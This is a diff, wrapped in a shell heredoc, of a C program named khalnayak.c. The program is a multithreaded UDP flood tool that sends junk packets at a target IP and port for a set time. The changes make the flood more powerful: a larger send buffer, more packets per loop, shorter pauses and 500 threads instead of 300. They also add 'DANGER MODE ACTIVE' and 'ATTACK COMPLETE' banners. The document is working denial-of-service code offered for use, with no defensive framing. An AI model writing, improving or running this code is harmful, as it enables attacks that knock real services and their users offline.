@@ -1,3 +1,4 @@
+cat > khalnayak.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -23,6 +24,9 @@ void *strike(void *arg) {
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return NULL;
     
+    int buf = 10 * 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
+    
     memset(packet, 'X', sizeof(packet));
     
     dest.sin_family = AF_INET;
@@ -30,12 +34,12 @@ void *strike(void *arg) {
     dest.sin_addr.s_addr = inet_addr(target_ip);
     
     while (running) {
-        for(int i = 0; i < 50; i++) {
+        for(int i = 0; i < 100; i++) {
             sendto(sock, packet, sizeof(packet), 0, 
                    (struct sockaddr *)&dest, sizeof(dest));
             total_sent++;
         }
-        usleep(100);
+        usleep(50);
     }
     close(sock);
     return NULL;
@@ -51,11 +55,16 @@ int main(int argc, char *argv[]) {
     target_port = atoi(argv[2]);
     int time_limit = atoi(argv[3]);
     
-    int threads = 300;
+    int threads = 500;
     pthread_t t[threads];
     int ids[threads];
     
-    printf("\n[+] ATTACK: %s:%d for %ds\n", target_ip, target_port, time_limit);
+    printf("\n========================================\n");
+    printf("🔥 DANGER MODE ACTIVE\n");
+    printf("🎯 Target: %s:%d\n", target_ip, target_port);
+    printf("⏱️ Time: %d seconds\n", time_limit);
+    printf("⚡ Threads: %d\n", threads);
+    printf("========================================\n\n");
     
     for (int i = 0; i < threads; i++) {
         ids[i] = i;
@@ -64,13 +73,19 @@ int main(int argc, char *argv[]) {
     
     for(int i = 0; i < time_limit; i++) {
         sleep(1);
-        if(i % 5 == 0 && i > 0) {
-            printf("[%ds] Packets: %d\n", i, total_sent);
+        if((i+1) % 5 == 0) {
+            printf("[%d/%d] 💥 Packets Sent: %d\n", i+1, time_limit, total_sent);
         }
     }
     
     running = 0;
     sleep(1);
-    printf("\n[+] FINISHED - Total packets: %d\n", total_sent);
+    
+    printf("\n========================================\n");
+    printf("✅ ATTACK COMPLETE\n");
+    printf("📊 Total Packets: %d\n", total_sent);
+    printf("========================================\n\n");
+    
     return 0;
 }
+EOF
